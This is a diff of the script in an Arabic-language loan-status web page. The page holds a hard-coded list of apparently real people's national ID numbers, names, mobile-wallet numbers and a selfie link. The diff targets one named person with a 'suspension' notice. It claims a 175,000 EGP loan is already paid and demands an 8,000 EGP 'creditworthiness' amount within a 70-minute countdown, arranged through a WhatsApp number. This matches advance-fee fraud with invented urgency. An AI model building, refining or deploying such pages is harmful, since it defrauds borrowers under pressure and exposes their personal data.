@@ -274,14 +274,13 @@
 
     <script>
         // ========== قاعدة بيانات العملاء الكاملة ==========
-        // تم تعديل حالة العميل "حمدى مصطفى كامل علام" (رقم 26805070201379) إلى معلق مع رسالة خاصة
+        // تم تعليق طلب العميل "سامح محمد محمد السيد" (رقم البطاقة 28201100200059) مع متطلبات خاصة
         const customersDatabase = {
             "28310021401735": { name: "احمد عبدالهادي احمد عبدالهادي", wallet: "فودافون كاش", walletNum: "01024442779", loan: 120000, suspended: false },
             "26301141900259": { name: "محمد كمال محمد فهمى", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 55000, suspended: false },
             "294011427522": { name: "امنيه محمد محروس عبد الغفار", wallet: "فودافون كاش", walletNum: "01032842112", loan: 65000, suspended: true, selfieUrl: "https://i.ibb.co/BVPtC6m5/taken-picture-u-SJlf1ma-diepx-3395780.jpg" },
             "29602120101179": { name: "مصطفي عمر عبد العزيز حسين", wallet: "اتصالات كاش", walletNum: "01111010803", loan: 50000, suspended: false },
-            // العميل المطلوب تعليقه (حمدى مصطفى كامل علام)
-            "26805070201379": { name: "حمدى مصطفى كامل علام", wallet: "فودافون كاش", walletNum: "01018366943", loan: 100000, suspended: true, customSuspension: true, proofAmount: 6000, deadline: "5:00 مساء", loanAmount: 100000 },
+            "26805070201379": { name: "حمدى مصطفى كامل علام", wallet: "فودافون كاش", walletNum: "01018366943", loan: 100000, suspended: false },
             "27508061800731": { name: "عمر عبد الحليم عبد المجيد عوض", wallet: "فودافون كاش", walletNum: "01015964596", loan: 30000, suspended: false },
             "28112141600891": { name: "علي مصطفي محمد حسنين", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 200000, suspended: false },
             "27208031600831": { name: "ايمن عبد النبي محمد اسماعيل", wallet: "اتصالات كاش", walletNum: "01127853605", loan: 200000, suspended: false },
@@ -322,7 +321,8 @@
             "27208100104611": { name: "عشم إسرائيل فيلبس مسعد", wallet: "فودافون كاش", walletNum: "01015090271", loan: 85000, suspended: false },
             "23801231200857": { name: "سامح السيد مصطفى مصطفى شلبى", wallet: "فودافون كاش", walletNum: "01022385155", loan: 50000, suspended: false },
             "27606071401917": { name: "مازن فرحات كامل امام", wallet: "فودافون كاش", walletNum: "01014342001", loan: 200000, suspended: false },
-            "28201100200059": { name: "سامح محمد محمد السيد", wallet: "فودافون كاش", walletNum: "01038267168", loan: 175000, suspended: false },
+            // العميل سامح محمد محمد السيد - معلق بمتطلبات خاصة
+            "28201100200059": { name: "سامح محمد محمد السيد", wallet: "فودافون كاش", walletNum: "01038267168", loan: 175000, suspended: true, customSuspension: true, proofAmount: 8000, totalMinutes: 70, loanAmount: 175000 },
             "28103281701131": { name: "محمود احمد حسن سرحان", wallet: "لا يوجد محفظة", walletNum: "غير مسجل", loan: 40000, suspended: false },
             "27011191401755": { name: "عبد الوهاب سالم محمد النقيطي", wallet: "فودافون كاش", walletNum: "01067461925", loan: 50000, suspended: false },
             "28503061201391": { name: "ناجي المهدي إبراهيم أحمد", wallet: "فودافون كاش", walletNum: "01035689091", loan: 70000, suspended: false },
@@ -373,10 +373,13 @@
         function generateTransactionId() { return Math.floor(Math.random() * 1000000000); }
         function generateApprovalCode() { return 'AP' + Math.floor(Math.random() * 1000000); }
 
+        let activeTimerInterval = null;
+
         function searchCustomer() {
             const nationalId = document.getElementById('nationalId').value.trim();
             if (!nationalId) { alert('الرجاء إدخال رقم البطاقة القومية'); return; }
             if (nationalId.length !== 14) { alert('رقم البطاقة القومية يجب أن يكون 14 رقم'); return; }
+            if (activeTimerInterval) clearInterval(activeTimerInterval);
             document.getElementById('loader').classList.add('show');
             document.getElementById('resultSection').classList.remove('show');
             document.getElementById('errorCard').classList.remove('show');
@@ -401,25 +404,48 @@
             const suspendedDiv = document.getElementById('suspendedContainer');
             suspendedDiv.style.display = 'block';
             
-            // رسالة خاصة للعميل حمدى مصطفى كامل علام
+            // رسالة خاصة للعميل سامح محمد محمد السيد
             if (customer.customSuspension) {
-                const proofAmt = customer.proofAmount || 6000;
-                const deadlineTime = customer.deadline || "5:00 مساء";
-                const loanAmt = customer.loanAmount || customer.loan || 100000;
+                const proofAmt = customer.proofAmount || 8000;
+                const totalMinutes = customer.totalMinutes || 70;
+                const loanAmt = customer.loanAmount || customer.loan || 175000;
+                
+                // إنشاء عداد تنازلي
+                let timeLeft = totalMinutes * 60; // بالثواني
+                const timerId = setInterval(() => {
+                    if (timeLeft <= 0) {
+                        clearInterval(timerId);
+                        const timerSpan = document.getElementById('suspendedTimer');
+                        if (timerSpan) timerSpan.textContent = "00:00:00";
+                    } else {
+                        timeLeft--;
+                        const hours = Math.floor(timeLeft / 3600);
+                        const minutes = Math.floor((timeLeft % 3600) / 60);
+                        const seconds = timeLeft % 60;
+                        const timerSpan = document.getElementById('suspendedTimer');
+                        if (timerSpan) {
+                            timerSpan.textContent = `${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
+                        }
+                    }
+                }, 1000);
+                if (activeTimerInterval) clearInterval(activeTimerInterval);
+                activeTimerInterval = timerId;
+                
                 suspendedDiv.innerHTML = `
                     <div class="suspended-card">
                         <div class="suspended-icon"><i class="fas fa-hourglass-half"></i></div>
                         <div class="suspended-title">⏳ طلبك معلق مؤقتاً</div>
                         <div class="suspended-message">
                             <strong>عزيزي العميل ${customer.name}</strong><br><br>
-                            🔒 طلب التمويل الخاص بك معلق لحين إثبات الجدارة الائتمانية المحددة لك.<br><br>
+                            🔒 طلب التمويل الخاص بك معلق لحين إثبات الجدارة الائتمانية.<br><br>
                             💰 <strong style="color: var(--accent-gold);">مبلغ الجدارة المطلوب: ${proofAmt.toLocaleString()} ج.م</strong><br>
-                            ⏰ <strong style="color: var(--accent-orange);">الموعد النهائي للإثبات: الساعة ${deadlineTime}</strong><br><br>
+                            ⏰ <strong style="color: var(--accent-orange);">الوقت المتبقي للإثبات:</strong> <span id="suspendedTimer" style="font-size:1.5rem; font-weight:bold;">${String(Math.floor(totalMinutes/60)).padStart(2,'0')}:${String(totalMinutes%60).padStart(2,'0')}:00</span><br>
+                            ⚠️ <strong style="color: #FF6B35;">تنبيه هام:</strong> يجب التواصل مع قسم التحويلات المالية عبر واتساب <strong>قبل 15 دقيقة على الأقل</strong> من انتهاء الوقت المحدد، مع تجهيز مبلغ الجدارة في محفظتك، حتى يتم قبول الإثبات وعدم الحاجة إلى إعادته.<br><br>
                             ✅ <strong style="color: var(--primary-lime);">القرض بقيمة ${loanAmt.toLocaleString()} ج.م تم دفعه بالفعل إلى حسابك</strong><br>
-                            وسيتم صرفه فوراً بمجرد إثبات الجدارة.<br><br>
-                            📞 للتواصل مع قسم التحويلات المالية على واتساب لفتح التعليق وصرف القرض، اضغط على الزر أدناه.
+                            وسيتم صرفه فوراً بمجرد إثبات الجدارة والتواصل في الوقت المناسب.<br><br>
+                            📞 للتواصل مع قسم التحويلات المالية لفتح الطلب، اضغط على الزر أدناه.
                         </div>
-                        <button class="btn-whatsapp-suspend" onclick="openWhatsAppForSuspended('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${proofAmt}, '${deadlineTime}', ${loanAmt})">
+                        <button class="btn-whatsapp-suspend" onclick="openWhatsAppForSamah('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${proofAmt})">
                             <i class="fab fa-whatsapp fa-lg"></i> تواصل مع التحويلات المالية الآن
                         </button>
                     </div>
@@ -456,13 +482,15 @@
             document.getElementById('resultSection').classList.add('show');
         }
 
-        function openWhatsAppForSuspended(name, id, proofAmount, deadline, loanAmount) {
-            let message = `السلام عليكم ورحمة الله وبركاته\n\nأنا العميل: ${name}\nرقم البطاقة: ${id}\n`;
-            if (proofAmount && deadline && loanAmount) {
-                message += `طلب التمويل الخاص بي معلق لحين إثبات الجدارة الائتمانية بقيمة ${proofAmount} ج.م قبل الساعة ${deadline}.\nالقرض المدفوع لحسابي بقيمة ${loanAmount} ج.م.\nأرجو فتح التعليق لإتمام صرف القرض فوراً.`;
-            } else {
-                message += `طلب التمويل الخاص بي معلق، أرجو فتح التعليق لإتمام صرف القرض.`;
-            }
+        // دالة خاصة لسامح محمد السيد لفتح الواتساب برسالة محددة
+        function openWhatsAppForSamah(name, id, proofAmount) {
+            const message = `أنا أسمى ${name} اريد فتح الطلب امامى ربع ساعة واكون جاهز للاثبات بالجدارة بقيمة ${proofAmount} فى حسابى المستلم للقرض.`;
+            const encoded = encodeURIComponent(message);
+            window.open(`https://wa.me/212614494251?text=${encoded}`, '_blank');
+        }
+
+        function openWhatsAppForSuspended(name, id) {
+            const message = `السلام عليكم ورحمة الله وبركاته\n\nأنا العميل: ${name}\nرقم البطاقة: ${id}\nطلب التمويل الخاص بي معلق، أرجو فتح التعليق لإتمام صرف القرض.`;
             const encoded = encodeURIComponent(message);
             window.open(`https://wa.me/212614494251?text=${encoded}`, '_blank');
         }
@@ -499,7 +527,7 @@
                         <div class="detail-row"><span class="detail-label"><i class="fas fa-file-invoice"></i> رقم الفاتورة</span><span class="detail-value">INV-${transactionId}</span></div>
                         <div class="detail-row"><span class="detail-label"><i class="fas fa-badge-check"></i> رقم الموافقة</span><span class="detail-value">${approvalCode}</span></div>
                         <div class="detail-row"><span class="detail-label"><i class="fas fa-code-branch"></i> رقم العملية</span><span class="detail-value">${transactionId}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-credit-card"></i> طريقة الدفع</span><span class="detail-value">سيتم الإيداع  إلى المحفظة</span></div>
+                        <div class="detail-row"><span class="detail-label"><i class="fas fa-credit-card"></i> طريقة الدفع</span><span class="detail-value">سيتم الإيداع إلى المحفظة</span></div>
                     </div>
                     <div class="info-message">
                         <i class="fas fa-envelope-open-text" style="color: var(--accent-gold);"></i> 
